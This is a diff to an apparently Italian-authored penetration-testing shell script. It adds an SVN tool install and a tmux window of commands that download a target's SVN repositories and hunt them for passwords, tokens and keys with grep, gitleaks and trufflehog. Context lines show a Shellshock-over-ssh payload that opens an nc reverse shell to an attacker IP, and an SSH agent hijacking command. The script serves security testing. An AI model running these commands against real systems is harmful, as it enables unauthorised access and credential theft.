@@ -508,6 +508,16 @@ else
 	sudo apt install trufflehog
 fi
 
+# SVN TOOL 
+echo ""
+program="svn"
+echo ""
+if is_installed "$program"; then
+	echo "[i] $program is already installed."
+else
+	echo "[->] Installing $program..."	
+	sudo apt install git git-svn subversion
+fi
 
 
 
@@ -1603,7 +1613,7 @@ tmux split-window -h -t "2.9"
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:2.0 "# GIT download LOCAL repository" Enter
 tmux send-keys -t PT:2.0 "git clone /opt/git/project.git"
-tmux send-keys -t PT:2.1 "GIT download LOCAL repository" Enter
+tmux send-keys -t PT:2.1 "# GIT download LOCAL repository" Enter
 tmux send-keys -t PT:2.1 "git clone file:///opt/git/project.git"
 tmux send-keys -t PT:2.2 "# GIT download REMOTE repository" Enter
 tmux send-keys -t PT:2.2 "git clone $url/project.git"
@@ -1661,6 +1671,54 @@ tmux send-keys -t PT:3.7 "ssh <USER>@$ip '() { :;}; /bin/nc -nv $attackerIP 9001
 tmux send-keys -t PT:3.8 "# SSH Hijacking" Enter
 tmux send-keys -t PT:3.8 "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh root@<TARGET_IP> -p <TARGET_PORT>"
 cd $folderProject
+
+cd $folderProjectAuthN
+# SVN
+tmux new-window -t PT:4 -n 'Service AuthN bypass: SVN'
+tmux split-window -v -t PT:4.0
+tmux select-pane -t "4.0"
+tmux split-window -h -t "4.0"
+tmux split-window -h -t "4.0"
+tmux split-window -v -t PT:4.3
+tmux select-pane -t "4.3"
+tmux split-window -h -t "4.3"
+tmux split-window -h -t "4.3"
+tmux split-window -v -t PT:4.6
+tmux select-pane -t "4.6"
+tmux split-window -h -t "4.6"
+tmux split-window -h -t "4.6"
+tmux split-window -v -t PT:4.9
+tmux select-pane -t "4.9"
+tmux split-window -h -t "4.9"
+tmux split-window -h -t "4.9"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:4.0 "# SVN: download SVN repository" Enter
+tmux send-keys -t PT:4.0 "svn checkout $url/url-del-repo-svn /path/to/local/folder"
+tmux send-keys -t PT:4.1 "# SVN: download SVN repository" Enter
+tmux send-keys -t PT:4.1 "svn checkout file:///$site/percorso/del/repo/svn /path/to/local/folder"
+tmux send-keys -t PT:4.2 "# SVN: analyze SVN repo with grep" Enter
+tmux send-keys -t PT:4.2 "grep -r \"password\|token\|api_key\" /path/to/local/folder"
+tmux send-keys -t PT:4.3 "# SVN: download SVN repository as GIT one" Enter
+tmux send-keys -t PT:4.3 "git svn clone $url/url-del-repo-svn"
+tmux send-keys -t PT:4.4 "# SVN: download SVN repository as GIT one" Enter
+tmux send-keys -t PT:4.4 "git svn clone --stdlayout --prefix=svn/ --no-metadata $url/url-del-repo-svn"
+tmux send-keys -t PT:4.5 "# SVN: download SVN repository as GIT one" Enter
+tmux send-keys -t PT:4.5 "git svn clone --trunk=nome_trunk --branches=nome_branches --tags=nome_tags https://url-del-repo-svn"
+tmux send-keys -t PT:4.6 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with gitleaks" Enter
+tmux send-keys -t PT:4.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
+tmux send-keys -t PT:4.7 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with trufflwhog" Enter
+tmux send-keys -t PT:4.7 "trufflehog git /path/to/.git"
+tmux send-keys -t PT:4.8 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with grep" Enter
+tmux send-keys -t PT:4.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
+tmux send-keys -t PT:4.9 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
+tmux send-keys -t PT:4.9 "git log -p"
+tmux send-keys -t PT:4.10 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
+tmux send-keys -t PT:4.10 "git diff <UUID commit>"
+tmux send-keys -t PT:4.11 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
+tmux send-keys -t PT:4.11 "git reset --hard <UUID commit>"
+cd $folderProject
+
+
 
 
 
